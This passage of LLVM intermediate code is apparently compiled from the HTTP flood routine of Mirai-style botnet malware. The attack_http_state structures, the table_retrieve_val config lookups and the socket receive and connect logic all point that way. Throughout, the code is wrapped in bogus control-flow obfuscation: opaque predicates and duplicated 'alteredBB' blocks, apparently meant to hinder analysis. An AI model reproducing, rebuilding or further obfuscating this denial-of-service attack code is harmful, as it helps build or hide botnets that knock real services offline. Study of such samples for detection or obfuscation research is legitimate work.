  %3765 = icmp slt i32 %3760, 10
  %3766 = or i1 %3764, %3765
  br i1 %3766, label %originalBBpart2673, label %originalBB671alteredBB

originalBBpart2673:                               ; preds = %originalBB671
  br label %3767

; <label>:3767:                                   ; preds = %originalBBpart2673, %originalBBpart2621
  br label %3768

; <label>:3768:                                   ; preds = %3767, %originalBBpart2603
  %3769 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3770 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3769, i32 0, i32 14
  %3771 = load i32, i32* %3770, align 4
  %3772 = icmp eq i32 %3771, 0
  br i1 %3772, label %3773, label %3915

; <label>:3773:                                   ; preds = %3768
  %3774 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3775 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3774, i32 0, i32 13
  %3776 = load i32, i32* %3775, align 4
  %3777 = icmp eq i32 %3776, 1
  br i1 %3777, label %3778, label %3882

; <label>:3778:                                   ; preds = %3773
  %3779 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3780 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3779, i32 0, i32 18
  %3781 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3780, i32 0, i32 0
  %3782 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3783 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3782, i32 0, i32 17
  %3784 = load i32, i32* %3783, align 4
  %3785 = call i32 @util_memsearch(i8* %3781, i32 %3784, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  %3786 = icmp ne i32 %3785, -1
  br i1 %3786, label %3787, label %3881

; <label>:3787:                                   ; preds = %3778
  %3788 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3789 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3788, i32 0, i32 18
  %3790 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3789, i32 0, i32 0
  %3791 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3792 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3791, i32 0, i32 17
  %3793 = load i32, i32* %3792, align 4
  %3794 = call i32 @util_memsearch(i8* %3790, i32 %3793, i8* getelementptr inbounds ([3 x i8], [3 x i8]* @.str.5, i32 0, i32 0), i32 2)
  store i32 %3794, i32* %62, align 4
  %3795 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3796 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3795, i32 0, i32 18
  %3797 = load i32, i32* %62, align 4
  %3798 = sub nsw i32 %3797, 2
  %3799 = sext i32 %3798 to i64
  %3800 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3796, i64 0, i64 %3799
  store i8 0, i8* %3800, align 1
  %3801 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3802 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3801, i32 0, i32 18
  %3803 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3802, i32 0, i32 0
  %3804 = load i32, i32* %62, align 4
  %3805 = call i32 @util_memsearch(i8* %3803, i32 %3804, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %3806 = icmp ne i32 %3805, -1
  br i1 %3806, label %3807, label %3833

; <label>:3807:                                   ; preds = %3787
  %3808 = load i32, i32* @x.17
  %3809 = load i32, i32* @y.18
  %3810 = sub i32 %3808, 1
  %3811 = mul i32 %3808, %3810
  %3812 = urem i32 %3811, 2
  %3813 = icmp eq i32 %3812, 0
  %3814 = icmp slt i32 %3809, 10
  %3815 = or i1 %3813, %3814
  br i1 %3815, label %originalBB675, label %originalBB675alteredBB

originalBB675:                                    ; preds = %originalBB675alteredBB, %3807
  %3816 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3817 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3816, i32 0, i32 18
  %3818 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3819 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3818, i32 0, i32 18
  %3820 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3819, i32 0, i32 0
  %3821 = load i32, i32* %62, align 4
  %3822 = call i32 @util_memsearch(i8* %3820, i32 %3821, i8* getelementptr inbounds ([2 x i8], [2 x i8]* @.str.9, i32 0, i32 0), i32 1)
  %3823 = sext i32 %3822 to i64
  %3824 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3817, i64 0, i64 %3823
  store i8 0, i8* %3824, align 1
  %3825 = load i32, i32* @x.17
  %3826 = load i32, i32* @y.18
  %3827 = sub i32 %3825, 1
  %3828 = mul i32 %3825, %3827
  %3829 = urem i32 %3828, 2
  %3830 = icmp eq i32 %3829, 0
  %3831 = icmp slt i32 %3826, 10
  %3832 = or i1 %3830, %3831
  br i1 %3832, label %originalBBpart2677, label %originalBB675alteredBB

originalBBpart2677:                               ; preds = %originalBB675
  br label %3833

; <label>:3833:                                   ; preds = %originalBBpart2677, %3787
  %3834 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3835 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3834, i32 0, i32 18
  %3836 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3835, i32 0, i32 0
  %3837 = call i32 @util_atoi(i8* %3836, i32 16)
  store i32 %3837, i32* %63, align 4
  %3838 = load i32, i32* %63, align 4
  %3839 = icmp eq i32 %3838, 0
  br i1 %3839, label %3840, label %3859

; <label>:3840:                                   ; preds = %3833
  %3841 = load i32, i32* @x.17
  %3842 = load i32, i32* @y.18
  %3843 = sub i32 %3841, 1
  %3844 = mul i32 %3841, %3843
  %3845 = urem i32 %3844, 2
  %3846 = icmp eq i32 %3845, 0
  %3847 = icmp slt i32 %3842, 10
  %3848 = or i1 %3846, %3847
  br i1 %3848, label %originalBB679, label %originalBB679alteredBB

originalBB679:                                    ; preds = %originalBB679alteredBB, %3840
  %3849 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3850 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3849, i32 0, i32 1
  store i8 1, i8* %3850, align 4
  %3851 = load i32, i32* @x.17
  %3852 = load i32, i32* @y.18
  %3853 = sub i32 %3851, 1
  %3854 = mul i32 %3851, %3853
  %3855 = urem i32 %3854, 2
  %3856 = icmp eq i32 %3855, 0
  %3857 = icmp slt i32 %3852, 10
  %3858 = or i1 %3856, %3857
  br i1 %3858, label %originalBBpart2681, label %originalBB679alteredBB

originalBBpart2681:                               ; preds = %originalBB679
  br label %3984

; <label>:3859:                                   ; preds = %3833
  %3860 = load i32, i32* @x.17
  %3861 = load i32, i32* @y.18
  %3862 = sub i32 %3860, 1
  %3863 = mul i32 %3860, %3862
  %3864 = urem i32 %3863, 2
  %3865 = icmp eq i32 %3864, 0
  %3866 = icmp slt i32 %3861, 10
  %3867 = or i1 %3865, %3866
  br i1 %3867, label %originalBB683, label %originalBB683alteredBB

originalBB683:                                    ; preds = %originalBB683alteredBB, %3859
  %3868 = load i32, i32* %63, align 4
  %3869 = add nsw i32 %3868, 2
  %3870 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3871 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3870, i32 0, i32 14
  store i32 %3869, i32* %3871, align 4
  %3872 = load i32, i32* %62, align 4
  store i32 %3872, i32* %59, align 4
  %3873 = load i32, i32* @x.17
  %3874 = load i32, i32* @y.18
  %3875 = sub i32 %3873, 1
  %3876 = mul i32 %3873, %3875
  %3877 = urem i32 %3876, 2
  %3878 = icmp eq i32 %3877, 0
  %3879 = icmp slt i32 %3874, 10
  %3880 = or i1 %3878, %3879
  br i1 %3880, label %originalBBpart2693, label %originalBB683alteredBB

originalBBpart2693:                               ; preds = %originalBB683
  br label %3881

; <label>:3881:                                   ; preds = %originalBBpart2693, %3778
  br label %3898

; <label>:3882:                                   ; preds = %3773
  %3883 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3884 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3883, i32 0, i32 17
  %3885 = load i32, i32* %3884, align 4
  %3886 = load i32, i32* %59, align 4
  %3887 = sub nsw i32 %3885, %3886
  %3888 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3889 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3888, i32 0, i32 14
  store i32 %3887, i32* %3889, align 4
  %3890 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3891 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3890, i32 0, i32 14
  %3892 = load i32, i32* %3891, align 4
  %3893 = icmp eq i32 %3892, 0
  br i1 %3893, label %3894, label %3897

; <label>:3894:                                   ; preds = %3882
  %3895 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3896 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3895, i32 0, i32 1
  store i8 1, i8* %3896, align 4
  br label %3984

; <label>:3897:                                   ; preds = %3882
  br label %3898

; <label>:3898:                                   ; preds = %3897, %3881
  %3899 = load i32, i32* @x.17
  %3900 = load i32, i32* @y.18
  %3901 = sub i32 %3899, 1
  %3902 = mul i32 %3899, %3901
  %3903 = urem i32 %3902, 2
  %3904 = icmp eq i32 %3903, 0
  %3905 = icmp slt i32 %3900, 10
  %3906 = or i1 %3904, %3905
  br i1 %3906, label %originalBB695, label %originalBB695alteredBB

originalBB695:                                    ; preds = %originalBB695alteredBB, %3898
  %3907 = load i32, i32* @x.17
  %3908 = load i32, i32* @y.18
  %3909 = sub i32 %3907, 1
  %3910 = mul i32 %3907, %3909
  %3911 = urem i32 %3910, 2
  %3912 = icmp eq i32 %3911, 0
  %3913 = icmp slt i32 %3908, 10
  %3914 = or i1 %3912, %3913
  br i1 %3914, label %originalBBpart2697, label %originalBB695alteredBB

originalBBpart2697:                               ; preds = %originalBB695
  br label %3915

; <label>:3915:                                   ; preds = %originalBBpart2697, %3768
  %3916 = load i32, i32* @x.17
  %3917 = load i32, i32* @y.18
  %3918 = sub i32 %3916, 1
  %3919 = mul i32 %3916, %3918
  %3920 = urem i32 %3919, 2
  %3921 = icmp eq i32 %3920, 0
  %3922 = icmp slt i32 %3917, 10
  %3923 = or i1 %3921, %3922
  br i1 %3923, label %originalBB699, label %originalBB699alteredBB

originalBB699:                                    ; preds = %originalBB699alteredBB, %3915
  %3924 = load i32, i32* %59, align 4
  %3925 = icmp eq i32 %3924, 0
  %3926 = load i32, i32* @x.17
  %3927 = load i32, i32* @y.18
  %3928 = sub i32 %3926, 1
  %3929 = mul i32 %3926, %3928
  %3930 = urem i32 %3929, 2
  %3931 = icmp eq i32 %3930, 0
  %3932 = icmp slt i32 %3927, 10
  %3933 = or i1 %3931, %3932
  br i1 %3933, label %originalBBpart2701, label %originalBB699alteredBB

originalBBpart2701:                               ; preds = %originalBB699
  br i1 %3925, label %3934, label %3951

; <label>:3934:                                   ; preds = %originalBBpart2701
  %3935 = load i32, i32* @x.17
  %3936 = load i32, i32* @y.18
  %3937 = sub i32 %3935, 1
  %3938 = mul i32 %3935, %3937
  %3939 = urem i32 %3938, 2
  %3940 = icmp eq i32 %3939, 0
  %3941 = icmp slt i32 %3936, 10
  %3942 = or i1 %3940, %3941
  br i1 %3942, label %originalBB703, label %originalBB703alteredBB

originalBB703:                                    ; preds = %originalBB703alteredBB, %3934
  %3943 = load i32, i32* @x.17
  %3944 = load i32, i32* @y.18
  %3945 = sub i32 %3943, 1
  %3946 = mul i32 %3943, %3945
  %3947 = urem i32 %3946, 2
  %3948 = icmp eq i32 %3947, 0
  %3949 = icmp slt i32 %3944, 10
  %3950 = or i1 %3948, %3949
  br i1 %3950, label %originalBBpart2705, label %originalBB703alteredBB

originalBBpart2705:                               ; preds = %originalBB703
  br label %3984

; <label>:3951:                                   ; preds = %originalBBpart2701
  %3952 = load i32, i32* %59, align 4
  %3953 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3954 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3953, i32 0, i32 17
  %3955 = load i32, i32* %3954, align 4
  %3956 = sub nsw i32 %3955, %3952
  store i32 %3956, i32* %3954, align 4
  %3957 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3958 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3957, i32 0, i32 18
  %3959 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3958, i32 0, i32 0
  %3960 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3961 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3960, i32 0, i32 18
  %3962 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3961, i32 0, i32 0
  %3963 = load i32, i32* %59, align 4
  %3964 = sext i32 %3963 to i64
  %3965 = getelementptr inbounds i8, i8* %3962, i64 %3964
  %3966 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3967 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3966, i32 0, i32 17
  %3968 = load i32, i32* %3967, align 4
  %3969 = sext i32 %3968 to i64
  call void @llvm.memmove.p0i8.p0i8.i64(i8* %3959, i8* %3965, i64 %3969, i32 1, i1 false)
  %3970 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3971 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3970, i32 0, i32 18
  %3972 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3973 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3972, i32 0, i32 17
  %3974 = load i32, i32* %3973, align 4
  %3975 = sext i32 %3974 to i64
  %3976 = getelementptr inbounds [1024 x i8], [1024 x i8]* %3971, i64 0, i64 %3975
  store i8 0, i8* %3976, align 1
  %3977 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3978 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3977, i32 0, i32 17
  %3979 = load i32, i32* %3978, align 4
  %3980 = icmp eq i32 %3979, 0
  br i1 %3980, label %3981, label %3982

; <label>:3981:                                   ; preds = %3951
  br label %3984

; <label>:3982:                                   ; preds = %3951
  br label %3983

; <label>:3983:                                   ; preds = %3982
  br label %3480

; <label>:3984:                                   ; preds = %3981, %originalBBpart2705, %3894, %originalBBpart2681, %originalBBpart2669
  br label %3370

; <label>:3985:                                   ; preds = %3470, %3376
  br label %4118

; <label>:3986:                                   ; preds = %3363
  %3987 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %3988 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %3987, i32 0, i32 1
  %3989 = load i8, i8* %3988, align 4
  %3990 = zext i8 %3989 to i32
  %3991 = icmp eq i32 %3990, 10
  br i1 %3991, label %3992, label %4101

; <label>:3992:                                   ; preds = %3986
  %3993 = load i32, i32* @x.17
  %3994 = load i32, i32* @y.18
  %3995 = sub i32 %3993, 1
  %3996 = mul i32 %3993, %3995
  %3997 = urem i32 %3996, 2
  %3998 = icmp eq i32 %3997, 0
  %3999 = icmp slt i32 %3994, 10
  %4000 = or i1 %3998, %3999
  br i1 %4000, label %originalBB707, label %originalBB707alteredBB

originalBB707:                                    ; preds = %originalBB707alteredBB, %3992
  %4001 = load i32, i32* @x.17
  %4002 = load i32, i32* @y.18
  %4003 = sub i32 %4001, 1
  %4004 = mul i32 %4001, %4003
  %4005 = urem i32 %4004, 2
  %4006 = icmp eq i32 %4005, 0
  %4007 = icmp slt i32 %4002, 10
  %4008 = or i1 %4006, %4007
  br i1 %4008, label %originalBBpart2709, label %originalBB707alteredBB

originalBBpart2709:                               ; preds = %originalBB707
  br label %4009

; <label>:4009:                                   ; preds = %4074, %originalBBpart2709
  %4010 = call i32* @__errno_location() #7
  store i32 0, i32* %4010, align 4
  %4011 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4012 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4011, i32 0, i32 0
  %4013 = load i32, i32* %4012, align 4
  %4014 = getelementptr inbounds [10241 x i8], [10241 x i8]* %20, i32 0, i32 0
  %4015 = call i64 @recv(i32 %4013, i8* %4014, i64 10240, i32 16384)
  %4016 = trunc i64 %4015 to i32
  store i32 %4016, i32* %12, align 4
  %4017 = load i32, i32* %12, align 4
  %4018 = icmp eq i32 %4017, 0
  br i1 %4018, label %4019, label %4021

; <label>:4019:                                   ; preds = %4009
  %4020 = call i32* @__errno_location() #7
  store i32 104, i32* %4020, align 4
  store i32 -1, i32* %12, align 4
  br label %4021

; <label>:4021:                                   ; preds = %4019, %4009
  %4022 = load i32, i32* @x.17
  %4023 = load i32, i32* @y.18
  %4024 = sub i32 %4022, 1
  %4025 = mul i32 %4022, %4024
  %4026 = urem i32 %4025, 2
  %4027 = icmp eq i32 %4026, 0
  %4028 = icmp slt i32 %4023, 10
  %4029 = or i1 %4027, %4028
  br i1 %4029, label %originalBB711, label %originalBB711alteredBB

originalBB711:                                    ; preds = %originalBB711alteredBB, %4021
  %4030 = load i32, i32* %12, align 4
  %4031 = icmp eq i32 %4030, -1
  %4032 = load i32, i32* @x.17
  %4033 = load i32, i32* @y.18
  %4034 = sub i32 %4032, 1
  %4035 = mul i32 %4032, %4034
  %4036 = urem i32 %4035, 2
  %4037 = icmp eq i32 %4036, 0
  %4038 = icmp slt i32 %4033, 10
  %4039 = or i1 %4037, %4038
  br i1 %4039, label %originalBBpart2713, label %originalBB711alteredBB

originalBBpart2713:                               ; preds = %originalBB711
  br i1 %4031, label %4040, label %4074

; <label>:4040:                                   ; preds = %originalBBpart2713
  %4041 = call i32* @__errno_location() #7
  %4042 = load i32, i32* %4041, align 4
  %4043 = icmp ne i32 %4042, 11
  br i1 %4043, label %4044, label %4073

; <label>:4044:                                   ; preds = %4040
  %4045 = call i32* @__errno_location() #7
  %4046 = load i32, i32* %4045, align 4
  %4047 = icmp ne i32 %4046, 11
  br i1 %4047, label %4048, label %4073

; <label>:4048:                                   ; preds = %4044
  %4049 = load i32, i32* @x.17
  %4050 = load i32, i32* @y.18
  %4051 = sub i32 %4049, 1
  %4052 = mul i32 %4049, %4051
  %4053 = urem i32 %4052, 2
  %4054 = icmp eq i32 %4053, 0
  %4055 = icmp slt i32 %4050, 10
  %4056 = or i1 %4054, %4055
  br i1 %4056, label %originalBB715, label %originalBB715alteredBB

originalBB715:                                    ; preds = %originalBB715alteredBB, %4048
  %4057 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4058 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4057, i32 0, i32 0
  %4059 = load i32, i32* %4058, align 4
  %4060 = call i32 @close(i32 %4059)
  %4061 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4062 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4061, i32 0, i32 0
  store i32 -1, i32* %4062, align 4
  %4063 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4064 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4063, i32 0, i32 1
  store i8 0, i8* %4064, align 4
  %4065 = load i32, i32* @x.17
  %4066 = load i32, i32* @y.18
  %4067 = sub i32 %4065, 1
  %4068 = mul i32 %4065, %4067
  %4069 = urem i32 %4068, 2
  %4070 = icmp eq i32 %4069, 0
  %4071 = icmp slt i32 %4066, 10
  %4072 = or i1 %4070, %4071
  br i1 %4072, label %originalBBpart2717, label %originalBB715alteredBB

originalBBpart2717:                               ; preds = %originalBB715
  br label %4073

; <label>:4073:                                   ; preds = %originalBBpart2717, %4044, %4040
  br label %4075

; <label>:4074:                                   ; preds = %originalBBpart2713
  br label %4009

; <label>:4075:                                   ; preds = %4073
  %4076 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4077 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4076, i32 0, i32 1
  %4078 = load i8, i8* %4077, align 4
  %4079 = zext i8 %4078 to i32
  %4080 = icmp ne i32 %4079, 0
  br i1 %4080, label %4081, label %4100

; <label>:4081:                                   ; preds = %4075
  %4082 = load i32, i32* @x.17
  %4083 = load i32, i32* @y.18
  %4084 = sub i32 %4082, 1
  %4085 = mul i32 %4082, %4084
  %4086 = urem i32 %4085, 2
  %4087 = icmp eq i32 %4086, 0
  %4088 = icmp slt i32 %4083, 10
  %4089 = or i1 %4087, %4088
  br i1 %4089, label %originalBB719, label %originalBB719alteredBB

originalBB719:                                    ; preds = %originalBB719alteredBB, %4081
  %4090 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4091 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4090, i32 0, i32 1
  store i8 1, i8* %4091, align 4
  %4092 = load i32, i32* @x.17
  %4093 = load i32, i32* @y.18
  %4094 = sub i32 %4092, 1
  %4095 = mul i32 %4092, %4094
  %4096 = urem i32 %4095, 2
  %4097 = icmp eq i32 %4096, 0
  %4098 = icmp slt i32 %4093, 10
  %4099 = or i1 %4097, %4098
  br i1 %4099, label %originalBBpart2721, label %originalBB719alteredBB

originalBBpart2721:                               ; preds = %originalBB719
  br label %4100

; <label>:4100:                                   ; preds = %originalBBpart2721, %4075
  br label %4101

; <label>:4101:                                   ; preds = %4100, %3986
  %4102 = load i32, i32* @x.17
  %4103 = load i32, i32* @y.18
  %4104 = sub i32 %4102, 1
  %4105 = mul i32 %4102, %4104
  %4106 = urem i32 %4105, 2
  %4107 = icmp eq i32 %4106, 0
  %4108 = icmp slt i32 %4103, 10
  %4109 = or i1 %4107, %4108
  br i1 %4109, label %originalBB723, label %originalBB723alteredBB

originalBB723:                                    ; preds = %originalBB723alteredBB, %4101
  %4110 = load i32, i32* @x.17
  %4111 = load i32, i32* @y.18
  %4112 = sub i32 %4110, 1
  %4113 = mul i32 %4110, %4112
  %4114 = urem i32 %4113, 2
  %4115 = icmp eq i32 %4114, 0
  %4116 = icmp slt i32 %4111, 10
  %4117 = or i1 %4115, %4116
  br i1 %4117, label %originalBBpart2725, label %originalBB723alteredBB

originalBBpart2725:                               ; preds = %originalBB723
  br label %4118

; <label>:4118:                                   ; preds = %originalBBpart2725, %3985
  br label %4119

; <label>:4119:                                   ; preds = %4118, %3354
  br label %4120

; <label>:4120:                                   ; preds = %4119, %originalBBpart2268
  br label %4121

; <label>:4121:                                   ; preds = %4120, %originalBBpart2579, %2631, %1610, %1561, %originalBBpart2230, %originalBBpart2198
  %4122 = load i32, i32* @x.17
  %4123 = load i32, i32* @y.18
  %4124 = sub i32 %4122, 1
  %4125 = mul i32 %4122, %4124
  %4126 = urem i32 %4125, 2
  %4127 = icmp eq i32 %4126, 0
  %4128 = icmp slt i32 %4123, 10
  %4129 = or i1 %4127, %4128
  br i1 %4129, label %originalBB727, label %originalBB727alteredBB

originalBB727:                                    ; preds = %originalBB727alteredBB, %4121
  %4130 = load i32, i32* %9, align 4
  %4131 = add nsw i32 %4130, 1
  store i32 %4131, i32* %9, align 4
  %4132 = load i32, i32* @x.17
  %4133 = load i32, i32* @y.18
  %4134 = sub i32 %4132, 1
  %4135 = mul i32 %4132, %4134
  %4136 = urem i32 %4135, 2
  %4137 = icmp eq i32 %4136, 0
  %4138 = icmp slt i32 %4133, 10
  %4139 = or i1 %4137, %4138
  br i1 %4139, label %originalBBpart2741, label %originalBB727alteredBB

originalBBpart2741:                               ; preds = %originalBB727
  br label %1346

; <label>:4140:                                   ; preds = %1346
  br label %462

; <label>:4141:                                   ; preds = %136, %131, %110, %89
  ret void

originalBBalteredBB:                              ; preds = %originalBB, %90
  %4142 = load i8*, i8** %17, align 8
  %4143 = call i32 @util_strlen(i8* %4142)
  %4144 = icmp sgt i32 %4143, 255
  br label %originalBB

originalBB1alteredBB:                             ; preds = %originalBB1, %111
  %4145 = load i8*, i8** %16, align 8
  %4146 = call i32 @util_strlen(i8* %4145)
  %4147 = icmp sgt i32 %4146, 127
  br label %originalBB1

originalBB6alteredBB:                             ; preds = %originalBB6, %159
  %4148 = load i8*, i8** %15, align 8
  %4149 = load i32, i32* %10, align 4
  %4150 = sext i32 %4149 to i64
  %4151 = getelementptr inbounds i8, i8* %4148, i64 %4150
  %4152 = load i8, i8* %4151, align 1
  %4153 = sext i8 %4152 to i32
  %_ = sub i32 %4153, 32
  %gen = mul i32 %_, 32
  %_7 = shl i32 %4153, 32
  %_8 = shl i32 %4153, 32
  %4154 = sub nsw i32 %4153, 32
  %4155 = trunc i32 %4154 to i8
  store i8 %4155, i8* %4151, align 1
  br label %originalBB6

originalBB12alteredBB:                            ; preds = %originalBB12, %191
  store i32 256, i32* %18, align 4
  br label %originalBB12

originalBB16alteredBB:                            ; preds = %originalBB16, %392
  call void @table_unlock_val(i8 zeroext 67)
  %4156 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4157 = load i32, i32* %9, align 4
  %4158 = sext i32 %4157 to i64
  %4159 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4156, i64 %4158
  %4160 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4159, i32 0, i32 5
  %4161 = getelementptr inbounds [512 x i8], [512 x i8]* %4160, i32 0, i32 0
  %4162 = call i8* @table_retrieve_val(i32 67, i32* null)
  %4163 = call i32 @util_strcpy(i8* %4161, i8* %4162)
  call void @table_lock_val(i8 zeroext 67)
  br label %originalBB16

originalBB20alteredBB:                            ; preds = %originalBB20, %417
  %4164 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4165 = load i32, i32* %9, align 4
  %4166 = sext i32 %4165 to i64
  %4167 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4164, i64 %4166
  %4168 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4167, i32 0, i32 6
  %4169 = getelementptr inbounds [257 x i8], [257 x i8]* %4168, i32 0, i32 0
  %4170 = load i8*, i8** %17, align 8
  %4171 = call i32 @util_strcpy(i8* %4169, i8* %4170)
  br label %originalBB20

originalBB24alteredBB:                            ; preds = %originalBB24, %445
  br label %originalBB24

originalBB29alteredBB:                            ; preds = %originalBB29, %474
  br label %originalBB29

originalBB33alteredBB:                            ; preds = %originalBB33, %500
  store i32 0, i32* %9, align 4
  br label %originalBB33

originalBB37alteredBB:                            ; preds = %originalBB37, %521
  %4172 = load %struct.attack_http_state*, %struct.attack_http_state** %13, align 8
  %4173 = load i32, i32* %9, align 4
  %4174 = sext i32 %4173 to i64
  %4175 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4172, i64 %4174
  store %struct.attack_http_state* %4175, %struct.attack_http_state** %26, align 8
  %4176 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4177 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4176, i32 0, i32 1
  %4178 = load i8, i8* %4177, align 4
  %4179 = zext i8 %4178 to i32
  %4180 = icmp eq i32 %4179, 1
  br label %originalBB37

originalBB41alteredBB:                            ; preds = %originalBB41, %547
  %4181 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4182 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4181, i32 0, i32 12
  %4183 = load i32, i32* %4182, align 4
  %4184 = icmp ne i32 %4183, 0
  br label %originalBB41

originalBB45alteredBB:                            ; preds = %originalBB45, %575
  %4185 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4186 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4185, i32 0, i32 1
  %4187 = load i8, i8* %4186, align 4
  %4188 = zext i8 %4187 to i32
  %4189 = icmp eq i32 %4188, 0
  br label %originalBB45

originalBB49alteredBB:                            ; preds = %originalBB49, %614
  %4190 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4191 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4190, i32 0, i32 0
  %4192 = load i32, i32* %4191, align 4
  %4193 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4194 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4193, i32 0, i32 0
  %4195 = load i32, i32* %4194, align 4
  %4196 = call i32 (i32, i32, ...) @fcntl(i32 %4195, i32 3, i32 0)
  %_50 = sub i32 0, 2048
  %gen51 = add i32 %_50, %4196
  %_52 = sub i32 0, 2048
  %gen53 = add i32 %_52, %4196
  %_54 = sub i32 2048, %4196
  %gen55 = mul i32 %_54, %4196
  %_56 = shl i32 2048, %4196
  %_57 = sub i32 0, 2048
  %gen58 = add i32 %_57, %4196
  %_59 = sub i32 0, 2048
  %gen60 = add i32 %_59, %4196
  %4197 = or i32 2048, %4196
  %4198 = call i32 (i32, i32, ...) @fcntl(i32 %4192, i32 4, i32 %4197)
  store i32 65535, i32* %10, align 4
  %4199 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4200 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4199, i32 0, i32 0
  %4201 = load i32, i32* %4200, align 4
  %4202 = bitcast i32* %10 to i8*
  %4203 = call i32 @setsockopt(i32 %4201, i32 0, i32 8, i8* %4202, i32 4) #6
  %4204 = getelementptr inbounds %struct.sockaddr_in, %struct.sockaddr_in* %32, i32 0, i32 0
  store i16 2, i16* %4204, align 4
  %4205 = load %struct.attack_http_state*, %struct.attack_http_state** %26, align 8
  %4206 = getelementptr inbounds %struct.attack_http_state, %struct.attack_http_state* %4205, i32 0, i32 4
  %4207 = load i32, i32* %4206, align 4
